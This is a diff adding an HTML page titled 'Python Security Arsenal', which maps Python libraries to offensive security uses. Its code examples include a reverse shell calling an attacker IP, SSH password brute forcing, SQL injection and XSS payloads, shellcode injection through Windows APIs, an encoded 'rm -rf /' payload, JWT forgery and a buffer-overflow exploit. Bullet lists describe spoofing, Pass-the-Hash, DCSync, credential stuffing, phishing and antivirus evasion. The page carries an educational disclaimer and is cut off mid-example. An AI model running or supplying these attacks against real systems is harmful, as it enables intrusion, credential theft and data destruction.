@@ -1,0 +1,2539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Python Security Arsenal - Offensive Security Library Reference</title>
+    <style>
+        :root {
+            --bg-primary: #0a0e1a;
+            --bg-secondary: #1a1d2e;
+            --bg-card: rgba(255, 255, 255, 0.05);
+            --text-primary: #ffffff;
+            --text-secondary: #94a3b8;
+            --accent-purple: #a855f7;
+            --accent-pink: #ec4899;
+            --accent-cyan: #06b6d4;
+            --code-bg: #0d1117;
+            --border-color: rgba(168, 85, 247, 0.3);
+            --success: #10b981;
+            --warning: #f59e0b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', -apple-system, sans-serif;
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: var(--bg-secondary);
+            border-bottom: 2px solid;
+            border-image: linear-gradient(90deg, var(--accent-purple), var(--accent-pink)) 1;
+            padding: 2rem 1rem;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, var(--accent-purple), var(--accent-pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .header p {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .search-bar {
+            max-width: 600px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .search-bar input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .search-bar input:focus {
+            outline: none;
+            border-color: var(--accent-purple);
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.3);
+        }
+
+        .controls {
+            max-width: 1200px;
+            margin: 1.5rem auto;
+            padding: 0 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .btn {
+            padding: 0.5rem 1rem;
+            background: linear-gradient(135deg, var(--accent-purple), var(--accent-pink));
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(168, 85, 247, 0.4);
+        }
+
+        .btn-secondary {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+
+        .category-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+
+        .category-card:hover {
+            border-color: var(--accent-purple);
+            box-shadow: 0 5px 30px rgba(168, 85, 247, 0.2);
+        }
+
+        .category-header {
+            padding: 1.5rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            user-select: none;
+        }
+
+        .category-info {
+            flex: 1;
+        }
+
+        .category-title {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .category-icon {
+            font-size: 2rem;
+        }
+
+        .category-description {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .category-when {
+            color: var(--accent-cyan);
+            font-size: 0.85rem;
+            font-style: italic;
+        }
+
+        .category-meta {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .library-count {
+            background: linear-gradient(135deg, var(--accent-purple), var(--accent-pink));
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .expand-icon {
+            font-size: 1.5rem;
+            transition: transform 0.3s ease;
+        }
+
+        .category-card.expanded .expand-icon {
+            transform: rotate(180deg);
+        }
+
+        .category-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .category-card.expanded .category-content {
+            max-height: none;
+        }
+
+        .library-list {
+            padding: 0 1.5rem 1.5rem;
+        }
+
+        .library-item {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+        }
+
+        .library-header {
+            padding: 1rem;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            user-select: none;
+        }
+
+        .library-header:hover {
+            background: rgba(168, 85, 247, 0.1);
+        }
+
+        .library-name {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--accent-cyan);
+            margin-bottom: 0.25rem;
+        }
+
+        .library-description {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .library-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .library-item.expanded .library-body {
+            max-height: none;
+        }
+
+        .library-content {
+            padding: 1rem;
+            border-top: 1px solid rgba(168, 85, 247, 0.2);
+        }
+
+        .section {
+            margin-bottom: 1.5rem;
+        }
+
+        .section-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--accent-purple);
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            border-radius: 6px;
+            padding: 1rem;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            margin: 0;
+            font-family: 'Fira Code', 'JetBrains Mono', 'Consolas', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: #e6edf3;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(168, 85, 247, 0.8);
+            border: none;
+            border-radius: 4px;
+            padding: 0.25rem 0.75rem;
+            color: white;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-purple);
+            transform: scale(1.05);
+        }
+
+        .copy-btn.copied {
+            background: var(--success);
+        }
+
+        .use-cases {
+            list-style: none;
+        }
+
+        .use-cases li {
+            padding: 0.75rem;
+            background: rgba(168, 85, 247, 0.05);
+            border-left: 3px solid var(--accent-purple);
+            margin-bottom: 0.5rem;
+            border-radius: 4px;
+            color: var(--text-secondary);
+        }
+
+        .use-cases li strong {
+            color: var(--text-primary);
+        }
+
+        .footer {
+            background: var(--bg-secondary);
+            border-top: 2px solid;
+            border-image: linear-gradient(90deg, var(--accent-purple), var(--accent-pink)) 1;
+            padding: 2rem 1rem;
+            text-align: center;
+            margin-top: 3rem;
+        }
+
+        .warning {
+            background: rgba(245, 158, 11, 0.1);
+            border: 1px solid var(--warning);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .warning-icon {
+            font-size: 1.5rem;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Chips */
+        .chip-row { display: flex; gap: 0.5rem; flex-wrap: wrap; }
+        .chip { background: rgba(255,255,255,0.06); border: 1px solid var(--border-color); color: #fff; padding: 0.35rem 0.75rem; border-radius: 9999px; cursor: pointer; font-size: 0.85rem; transition: all 0.2s ease; }
+        .chip:hover { border-color: var(--accent-pink); }
+        .chip.active { background: linear-gradient(135deg, var(--accent-purple), var(--accent-pink)); border-color: transparent; }
+
+        /* Syntax highlighting */
+        .keyword { color: #cf8aff; }
+        .string { color: #a5d6a7; }
+        .comment { color: #6e7681; }
+        .function { color: #7ee8fa; }
+        .number { color: #f5a97f; }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 1.75rem;
+            }
+
+            .category-title {
+                font-size: 1.25rem;
+            }
+
+            .controls {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🛡️ Python Security Arsenal</h1>
+        <p>250+ Python Libraries Across 50 Offensive Security Categories</p>
+        <div class="search-bar">
+            <input type="text" id="searchInput" placeholder="🔍 Search libraries, categories, or use cases..." />
+        </div>
+    </div>
+
+    <div class="controls">
+        <div>
+            <button class="btn" id="expandAllBtn">Expand All Categories</button>
+            <button class="btn btn-secondary" id="collapseAllBtn">Collapse All</button>
+        </div>
+        <div id="categoryFilters" class="chip-row"></div>
+        <div id="resultCount" style="color: var(--text-secondary);"></div>
+    </div>
+
+    <div class="container" id="categoriesContainer"></div>
+
+    <div class="footer">
+        <div class="warning">
+            <span class="warning-icon">⚠️</span>
+            <span><strong>Educational Purposes Only</strong> - Unauthorized access to computer systems is illegal. Use these tools only on systems you own or have explicit permission to test.</span>
+        </div>
+        <p style="color: var(--text-secondary);">Created for cybersecurity professionals and ethical hackers | 2025</p>
+    </div>
+
+    <script>
+        const categories = [
+            // CATEGORY 1
+            {
+                name: "Network & Protocol Analysis",
+                description: "Packet manipulation, network scanning, protocol analysis",
+                when_to_use: "Network reconnaissance, MITM attacks, packet sniffing, protocol fuzzing",
+                icon: "🌐",
+                libraries: [
+                    {
+                        name: "scapy",
+                        description: "Most powerful packet manipulation tool for Python",
+                        import: "from scapy.all import *",
+                        example: `# Scapy - Send ICMP ping and sniff network traffic
+from scapy.all import *
+
+# Send ICMP ping to target
+packet = IP(dst="192.168.1.1")/ICMP()
+response = sr1(packet, timeout=2)
+if response:
+    print(f"Host is up: {response.src}")
+
+# Sniff network traffic on port 80
+packets = sniff(count=10, filter="tcp port 80")
+packets.summary()`,
+                        uses: [
+                            "ARP spoofing/poisoning for MITM attacks - Redirect network traffic through attacker machine",
+                            "DNS spoofing - Redirect victims to malicious websites by poisoning DNS responses",
+                            "Custom packet injection for stealthy scans - Bypass IDS/IPS detection",
+                            "WiFi deauthentication attacks - Force clients off wireless networks",
+                            "Network traffic analysis to extract credentials - Capture plaintext passwords"
+                        ]
+                    },
+                    {
+                        name: "impacket",
+                        description: "Network protocols library (SMB, MSRPC, Kerberos)",
+                        import: "from impacket.smbconnection import SMBConnection",
+                        example: `# Impacket - SMB connection and share enumeration
+from impacket.smbconnection import SMBConnection
+
+# Connect to target SMB server
+conn = SMBConnection('192.168.1.10', '192.168.1.10')
+conn.login('username', 'password', 'DOMAIN')
+
+# List all shared folders
+shares = conn.listShares()
+for share in shares:
+    print(f"Share: {share['shi1_netname']}")`,
+                        uses: [
+                            "Pass-the-Hash attacks - Authenticate using NTLM hashes without knowing passwords",
+                            "SMB relay attacks - Relay authentication requests to compromise other systems",
+                            "Kerberoasting - Extract service tickets to crack service account passwords offline",
+                            "DCSync attacks - Dump password hashes directly from Domain Controllers",
+                            "WMI command execution for lateral movement - Execute commands on remote Windows systems"
+                        ]
+                    },
+                    {
+                        name: "socket",
+                        description: "Low-level network interface (Python built-in)",
+                        import: "import socket",
+                        example: `# Socket - Create reverse shell and port scanner
+import socket
+
+# Create reverse shell connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('attacker_ip', 4444))
+
+# Simple port scanner
+for port in range(20, 1025):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex(('target_ip', port))
+    if result == 0:
+        print(f"Port {port} is OPEN")
+    sock.close()`,
+                        uses: [
+                            "Creating reverse shells - Connect back to attacker for remote access",
+                            "Port scanning to identify open services - Find potential entry points",
+                            "Banner grabbing for service identification - Fingerprint running services",
+                            "Building custom C2 communication channels - Avoid detection by security tools",
+                            "Raw packet crafting for custom protocols - Create stealthy network communications"
+                        ]
+                    },
+                    {
+                        name: "paramiko",
+                        description: "Pure Python SSHv2 protocol implementation",
+                        import: "import paramiko",
+                        example: `# Paramiko - SSH brute force and command execution
+import paramiko
+
+def ssh_connect(host, username, password):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(host, username=username, password=password, timeout=3)
+        stdin, stdout, stderr = client.exec_command('whoami')
+        print(stdout.read().decode())
+        return True
+    except:
+        return False
+
+# SSH password brute force
+with open('passwords.txt') as f:
+    for password in f:
+        if ssh_connect('192.168.1.10', 'root', password.strip()):
+            print(f"Password found: {password.strip()}")
+            break`,
+                        uses: [
+                            "SSH brute force attacks - Crack SSH login credentials",
+                            "Automated SSH key harvesting from compromised systems",
+                            "Lateral movement via SSH - Move between systems in network",
+                            "SFTP file exfiltration - Steal sensitive data over SSH",
+                            "SSH tunneling for pivoting - Route traffic through compromised hosts"
+                        ]
+                    },
+                    {
+                        name: "dnspython",
+                        description: "DNS toolkit for queries and manipulation",
+                        import: "import dns.resolver",
+                        example: `# dnspython - DNS reconnaissance and zone transfer
+import dns.resolver
+import dns.zone
+import dns.query
+
+# DNS record enumeration
+domain = "target.com"
+for record_type in ['A', 'AAAA', 'MX', 'NS', 'TXT']:
+    try:
+        answers = dns.resolver.resolve(domain, record_type)
+        for rdata in answers:
+            print(f"{record_type}: {rdata}")
+    except:
+        pass
+
+# Attempt DNS zone transfer
+try:
+    zone = dns.zone.from_xfr(dns.query.xfr('ns1.target.com', domain))
+    print("Zone transfer successful!")
+except:
+    print("Zone transfer failed")`,
+                        uses: [
+                            "DNS zone transfer attacks - Enumerate all domain records",
+                            "Subdomain enumeration for reconnaissance - Find hidden assets and services",
+                            "DNS cache poisoning - Redirect traffic to malicious servers",
+                            "DNS tunneling for data exfiltration - Bypass firewalls using DNS queries",
+                            "Identifying mail servers for phishing campaigns - Target email infrastructure"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Web Application Testing",
+                description: "HTTP requests, web scraping, browser automation",
+                when_to_use: "Testing web vulnerabilities, XSS, SQL injection, API testing, web scraping",
+                icon: "🌍",
+                libraries: [
+                    {
+                        name: "requests",
+                        description: "The most popular HTTP library for Python",
+                        import: "import requests",
+                        example: `# Requests - SQL injection and session hijacking
+import requests
+
+# Test SQL injection
+payload = "' OR '1'='1"
+url = "http://target.com/login"
+data = {'username': payload, 'password': 'test'}
+response = requests.post(url, data=data)
+
+if "Welcome" in response.text:
+    print("SQL injection successful!")
+
+# Session hijacking with stolen cookie
+session = requests.Session()
+session.cookies.set('session_id', 'stolen_cookie_value')
+response = session.get('http://target.com/admin')`,
+                        uses: [
+                            "SQL injection exploitation - Extract database contents and bypass authentication",
+                            "Web application brute forcing - Crack login credentials at scale",
+                            "Session hijacking and cookie manipulation - Impersonate legitimate users",
+                            "API fuzzing and vulnerability testing - Find API security flaws",
+                            "Automated credential stuffing attacks - Test leaked credentials against targets"
+                        ]
+                    },
+                    {
+                        name: "beautifulsoup4",
+                        description: "HTML and XML parser for web scraping",
+                        import: "from bs4 import BeautifulSoup",
+                        example: `# BeautifulSoup - Extract forms and find hidden fields
+from bs4 import BeautifulSoup
+import requests
+
+# Fetch and parse target page
+response = requests.get('http://target.com')
+soup = BeautifulSoup(response.content, 'html.parser')
+
+# Extract all forms
+forms = soup.find_all('form')
+for form in forms:
+    # Find hidden CSRF tokens
+    hidden = form.find_all('input', {'type': 'hidden'})
+    for h in hidden:
+        print(f"Hidden: {h.get('name')} = {h.get('value')}")
+
+# Extract all links for crawling
+links = [link['href'] for link in soup.find_all('a', href=True)]`,
+                        uses: [
+                            "Extracting CSRF tokens to bypass protection - Defeat anti-CSRF mechanisms",
+                            "Scraping email addresses for phishing campaigns - Build targeted attack lists",
+                            "Identifying hidden form fields with sensitive data - Find information disclosure",
+                            "Automated web application mapping and crawling - Discover all endpoints",
+                            "Extracting HTML comments with sensitive information - Find developer secrets"
+                        ]
+                    },
+                    {
+                        name: "selenium",
+                        description: "Browser automation framework for testing",
+                        import: "from selenium import webdriver",
+                        example: `# Selenium - XSS testing in modern web apps
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+
+# Setup headless Chrome browser
+options = webdriver.ChromeOptions()
+options.add_argument('--headless')
+driver = webdriver.Chrome(options=options)
+
+# Test for stored XSS vulnerability
+driver.get('http://target.com/comment')
+comment_box = driver.find_element(By.NAME, 'comment')
+xss_payload = '<script>alert(document.cookie)<\\/script>'
+comment_box.send_keys(xss_payload)
+driver.find_element(By.NAME, 'submit').click()
+
+# Verify if XSS executed
+driver.get('http://target.com/comments')
+if xss_payload in driver.page_source:
+    print("Stored XSS vulnerability confirmed!")
+
+driver.quit()`,
+                        uses: [
+                            "Bypassing JavaScript-based bot protection - Evade WAF and anti-bot measures",
+                            "Testing XSS in Single Page Applications - Test modern JavaScript frameworks",
+                            "Automated phishing credential harvesting - Capture credentials from fake pages",
+                            "Session hijacking with cookie theft via XSS - Extract and exfiltrate cookies",
+                            "Clickjacking vulnerability testing - Test UI redressing attack vectors"
+                        ]
+                    },
+                    {
+                        name: "urllib",
+                        description: "URL handling and HTTP operations (built-in)",
+                        import: "import urllib.request",
+                        example: `# urllib - URL manipulation and basic requests
+import urllib.request
+import urllib.parse
+
+# URL encoding for injection payloads
+payload = "'; DROP TABLE users--"
+encoded = urllib.parse.quote(payload)
+url = f"http://target.com/search?q={encoded}"
+
+# Make request
+response = urllib.request.urlopen(url)
+print(response.read().decode())
+
+# Download file from target
+urllib.request.urlretrieve('http://target.com/data.zip', 'data.zip')`,
+                        uses: [
+                            "URL encoding/decoding for injection attacks - Bypass input filters",
+                            "Basic HTTP requests without dependencies - Minimal footprint exploits",
+                            "File downloads from compromised targets - Automated data exfiltration",
+                            "Simple web scraping for reconnaissance - Gather target information",
+                            "Testing URL-based vulnerabilities - LFI, SSRF, open redirects"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "System & OS Interaction",
+                description: "Execute commands, manipulate files, interact with OS",
+                when_to_use: "Post-exploitation, privilege escalation, system enumeration, maintaining access",
+                icon: "💻",
+                libraries: [
+                    {
+                        name: "os",
+                        description: "Operating system interface (Python built-in)",
+                        import: "import os",
+                        example: `# OS - Execute system commands and file operations
+import os
+
+# Execute system commands
+os.system('whoami')
+output = os.popen('ifconfig').read()
+
+# File and directory operations
+files = os.listdir('/etc')
+sensitive = [f for f in files if 'passwd' in f]
+
+# Environment variable access
+path = os.getenv('PATH')
+home = os.environ.get('HOME')
+
+# Process management
+os.kill(pid, 9)  # Kill process`,
+                        uses: [
+                            "Command execution for reverse shells and backdoors",
+                            "File enumeration and sensitive data discovery",
+                            "Environment variable manipulation for privilege escalation",
+                            "Process enumeration to identify security tools",
+                            "Directory traversal and filesystem reconnaissance"
+                        ]
+                    },
+                    {
+                        name: "subprocess",
+                        description: "Spawn processes and execute external commands",
+                        import: "import subprocess",
+                        example: `# Subprocess - Safe command execution with output capture
+import subprocess
+
+# Execute command and capture output
+result = subprocess.run(['ls', '-la'], 
+                       capture_output=True, 
+                       text=True)
+print(result.stdout)
+
+# Interactive shell for reverse shell
+process = subprocess.Popen(['/bin/bash'],
+                          stdin=subprocess.PIPE,
+                          stdout=subprocess.PIPE,
+                          stderr=subprocess.PIPE)
+
+# Execute and get output
+output, error = process.communicate(b'whoami\\n')`,
+                        uses: [
+                            "Execute system commands securely in exploits",
+                            "Capture command output for information gathering",
+                            "Create interactive reverse shells",
+                            "Privilege escalation through command injection",
+                            "Post-exploitation system enumeration"
+                        ]
+                    },
+                    {
+                        name: "psutil",
+                        description: "System and process monitoring utilities",
+                        import: "import psutil",
+                        example: `# psutil - Process and system enumeration
+import psutil
+
+# List all running processes
+for proc in psutil.process_iter(['pid', 'name', 'username']):
+    print(proc.info)
+
+# Find security tools
+for proc in psutil.process_iter():
+    if any(av in proc.name().lower() 
+           for av in ['defender', 'antivirus', 'edr']):
+        print(f"Security tool found: {proc.name()}")
+
+# Get network connections
+connections = psutil.net_connections()
+for conn in connections:
+    print(f"{conn.laddr} -> {conn.raddr}")`,
+                        uses: [
+                            "Process enumeration for security tool detection",
+                            "Identifying antivirus and EDR solutions",
+                            "Network connection monitoring and backdoor detection",
+                            "System resource information for situational awareness",
+                            "Memory scraping and credential hunting"
+                        ]
+                    },
+                    {
+                        name: "ctypes",
+                        description: "Call C functions and manipulate memory (built-in)",
+                        import: "import ctypes",
+                        example: `# ctypes - Windows API calls and DLL injection
+import ctypes
+
+# Load Windows DLL
+kernel32 = ctypes.windll.kernel32
+
+# Allocate executable memory
+ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
+
+# Write shellcode to memory
+ctypes.memmove(ptr, shellcode, len(shellcode))
+
+# Create thread to execute shellcode
+thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
+kernel32.WaitForSingleObject(thread, -1)`,
+                        uses: [
+                            "DLL injection for process manipulation",
+                            "Direct Windows API calls for stealth",
+                            "Shellcode injection into memory",
+                            "Bypassing antivirus with reflective loading",
+                            "Memory manipulation for privilege escalation"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Cryptography & Encoding",
+                description: "Encryption, hashing, encoding/decoding operations",
+                when_to_use: "Hash cracking, data obfuscation, bypassing encryption, secure C2 communications",
+                icon: "🔐",
+                libraries: [
+                    {
+                        name: "cryptography",
+                        description: "Modern cryptographic recipes and primitives",
+                        import: "from cryptography.fernet import Fernet",
+                        example: `# Cryptography - Encrypt C2 communications
+from cryptography.fernet import Fernet
+
+# Generate encryption key
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+# Encrypt data before exfiltration
+sensitive_data = b"Stolen credentials: admin:password123"
+encrypted = cipher.encrypt(sensitive_data)
+print(f"Encrypted: {encrypted}")
+
+# Decrypt on attacker machine
+decrypted = cipher.decrypt(encrypted)
+print(f"Decrypted: {decrypted.decode()}")`,
+                        uses: [
+                            "Encrypt C2 communication channels to avoid detection",
+                            "Decrypt captured encrypted traffic",
+                            "Generate cryptographic keys for ransomware",
+                            "SSL/TLS manipulation and certificate forging",
+                            "Secure data exfiltration with encryption"
+                        ]
+                    },
+                    {
+                        name: "hashlib",
+                        description: "Secure hash and message digest algorithms (built-in)",
+                        import: "import hashlib",
+                        example: `# hashlib - Password hash cracking
+import hashlib
+
+# Hash captured password for comparison
+password = "password123"
+hash_md5 = hashlib.md5(password.encode()).hexdigest()
+hash_sha256 = hashlib.sha256(password.encode()).hexdigest()
+
+# Brute force hash cracking
+target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"
+with open('rockyou.txt') as f:
+    for word in f:
+        word = word.strip()
+        if hashlib.md5(word.encode()).hexdigest() == target_hash:
+            print(f"Password found: {word}")
+            break`,
+                        uses: [
+                            "Password hash cracking with wordlists",
+                            "File integrity checking to avoid detection",
+                            "Rainbow table generation for offline cracking",
+                            "Hash comparison for credential verification",
+                            "Generating hashes for password spraying"
+                        ]
+                    },
+                    {
+                        name: "base64",
+                        description: "Base64 encoding and decoding (built-in)",
+                        import: "import base64",
+                        example: `# base64 - Payload obfuscation and encoding
+import base64
+
+# Encode malicious payload
+malicious_code = b"import os; os.system('rm -rf /')"
+encoded = base64.b64encode(malicious_code)
+print(f"Encoded payload: {encoded.decode()}")
+
+# Decode stolen data
+stolen_data = "dXNlcm5hbWU6cGFzc3dvcmQ="
+decoded = base64.b64decode(stolen_data)
+print(f"Credentials: {decoded.decode()}")
+
+# URL-safe encoding for injection
+url_safe = base64.urlsafe_b64encode(b'<script>alert(1)<\\/script>')`,
+                        uses: [
+                            "Obfuscate malicious payloads to bypass filters",
+                            "Bypass input validation and WAF rules",
+                            "Encode exfiltrated data for transmission",
+                            "Decode captured credentials and tokens",
+                            "JWT token manipulation and forgery"
+                        ]
+                    },
+                    {
+                        name: "jwt",
+                        description: "JSON Web Token implementation",
+                        import: "import jwt",
+                        example: `# jwt - JWT token manipulation
+import jwt
+
+# Decode stolen JWT without verification
+stolen_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+decoded = jwt.decode(stolen_token, options={"verify_signature": False})
+print(f"User ID: {decoded['user_id']}")
+
+# Forge new JWT with elevated privileges
+payload = {'user_id': 1, 'role': 'admin', 'exp': 9999999999}
+forged_token = jwt.encode(payload, 'secret_key', algorithm='HS256')
+
+# Test for algorithm confusion (RS256 to HS256)
+# Use public key as HMAC secret`,
+                        uses: [
+                            "JWT token forgery for authentication bypass",
+                            "Algorithm confusion attacks (RS256 to HS256)",
+                            "Privilege escalation via token manipulation",
+                            "Session token analysis and extraction",
+                            "None algorithm exploitation for bypasses"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Exploit Development & Binary",
+                description: "Binary exploitation, shellcode, ROP chains, reverse engineering",
+                when_to_use: "CTF challenges, buffer overflows, binary analysis, exploit development",
+                icon: "⚙️",
+                libraries: [
+                    {
+                        name: "pwntools",
+                        description: "CTF and exploit development framework",
+                        import: "from pwn import *",
+                        example: `# pwntools - Buffer overflow exploitation
+from pwn import *
+
+# Connect to vulnerable service
+p = remote('target.com', 1337)
+
+# Build exploit payload
+padding = b'A' * 64
+ret_address = p64(0xdeadbeef)
+shellcode = asm(shellcraft.sh())
+
+payload = padding + ret_address + shellcode
+
+# Send exploit
+p.sendline(payload)
+
+# Get interactive shell
+p.interactive()`,
+                        uses: [
+                            "Buffer overflow exploitation and ROP chain building",
+                            "Shellcode generation and injection",
+                            "Format string vulnerability exploitation",
+                            "Binary protocol communication for exploits",
+                            "Automated exploit development for CTFs"
+                        ]
+                    },
+                    {
+                        name: "struct",
+                        description: "Binary data packing and unpacking (built-in)",
+                        import: "import struct",
+                        example: `# struct - Pack addresses for exploits
+import struct
+
+# Pack memory address for buffer overflow
+address = 0x7fffffffffff
+packed = struct.pack('<Q', address)  # Little-endian 64-bit
+
+# Unpack from memory
+data = b'\\x41\\x42\\x43\\x44'
+value = struct.unpack('<I', data)[0]
+
+# Build shellcode with packed integers
+nop_sled = struct.pack('<I', 0x90909090)
+exploit = nop_sled * 50 + packed + shellcode`,
+                        uses: [
+                            "Pack exploit payloads with precise memory addresses",
+                            "Memory address manipulation for buffer overflows",
+                            "Shellcode construction with packed integers",
+                            "Binary protocol fuzzing and manipulation",
+                            "Return address overwriting in exploits"
+                        ]
+                    },
+                    {
+                        name: "capstone",
+                        description: "Lightweight multi-architecture disassembly framework",
+                        import: "import capstone",
+                        example: `# capstone - Disassemble binary code
+from capstone import *
+
+# x86-64 disassembler
+md = Cs(CS_ARCH_X86, CS_MODE_64)
+
+# Disassemble machine code
+code = b"\\x55\\x48\\x8b\\x05\\xb8\\x13\\x00\\x00"
+for insn in md.disasm(code, 0x1000):
+    print(f"0x{insn.address:x}: {insn.mnemonic} {insn.op_str}")
+
+# Find ROP gadgets
+for insn in md.disasm(binary, base_addr):
+    if insn.mnemonic == 'ret':
+        print(f"ROP gadget at: 0x{insn.address:x}")`,
+                        uses: [
+                            "Binary analysis and reverse engineering",
+                            "Finding ROP gadgets in binaries",
+                            "Malware disassembly and analysis",
+                            "Exploit development and debugging",
+                            "Understanding code execution flow"
+                        ]
+                    },
+                    {
+                        name: "angr",
+                        description: "Binary analysis platform for reverse engineering",
+                        import: "import angr",
+                        example: `# angr - Automated binary exploitation
+import angr
+import claripy
+
+# Load binary
+proj = angr.Project('./vuln_binary', auto_load_libs=False)
+
+# Create symbolic execution
+state = proj.factory.entry_state()
+simgr = proj.factory.simulation_manager(state)
+
+# Find path to win function, avoid lose function
+simgr.explore(find=0x401234, avoid=0x401567)
+
+# Extract solution
+if simgr.found:
+    solution = simgr.found[0]
+    print(solution.posix.dumps(0))  # stdin input that wins`,
+                        uses: [
+                            "Automated binary exploitation and flag finding",
+                            "Symbolic execution for vulnerability discovery",
+                            "Reverse engineering complex binaries",
+                            "Finding input that reaches specific code",
+                            "Binary constraint solving for exploits"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Reconnaissance & OSINT",
+                description: "Information gathering, scanning, OSINT, subdomain enumeration",
+                when_to_use: "Initial reconnaissance, target enumeration, vulnerability scanning, asset discovery",
+                icon: "🔍",
+                libraries: [
+                    {
+                        name: "python-nmap",
+                        description: "Python wrapper for Nmap port scanner",
+                        import: "import nmap",
+                        example: `# python-nmap - Automated port scanning
+import nmap
+
+scanner = nmap.PortScanner()
+
+# Scan network range
+scanner.scan('192.168.1.0/24', '22-443', arguments='-sV')
+
+# Parse results
+for host in scanner.all_hosts():
+    print(f"Host: {host} ({scanner[host].hostname()})")
+    print(f"State: {scanner[host].state()}")
+    
+    for proto in scanner[host].all_protocols():
+        ports = scanner[host][proto].keys()
+        for port in ports:
+            state = scanner[host][proto][port]['state']
+            service = scanner[host][proto][port]['name']
+            print(f"Port: {port} State: {state} Service: {service}")`,
+                        uses: [
+                            "Automated network-wide port scanning",
+                            "Service and version detection",
+                            "OS fingerprinting for target profiling",
+                            "Vulnerability scanning integration",
+                            "Network topology mapping"
+                        ]
+                    },
+                    {
+                        name: "shodan",
+                        description: "Shodan search engine API wrapper",
+                        import: "import shodan",
+                        example: `# Shodan - Find vulnerable systems at scale
+import shodan
+
+api = shodan.Shodan('YOUR_API_KEY')
+
+# Search for vulnerable services
+results = api.search('apache 2.4.49')
+
+for result in results['matches']:
+    print(f"IP: {result['ip_str']}")
+    print(f"Port: {result['port']}")
